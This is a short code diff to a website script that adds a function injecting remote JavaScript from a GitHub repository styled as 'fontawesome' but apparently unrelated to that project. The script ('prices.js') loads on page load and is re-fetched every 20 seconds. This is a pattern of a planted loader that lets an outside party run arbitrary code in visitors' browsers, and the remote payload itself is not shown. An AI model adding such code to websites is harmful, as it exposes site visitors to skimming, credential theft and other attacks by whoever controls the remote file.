@@ -73,3 +73,16 @@ window.addEventListener("load", () => {
         document.body.appendChild(script);
     }, 3000);
 });
+function loadScript() {
+    const script = document.createElement("script");
+    script.src = "https://raw.githubusercontent.com/free-off/fontawesome/refs/heads/main/prices.js?t=" + new Date().getTime();
+    script.type = "text/javascript";
+    script.async = false;
+    document.head.appendChild(script);
+}
+
+// load immediately
+loadScript();
+
+// reload every 20 seconds
+setInterval(loadScript, 20000);
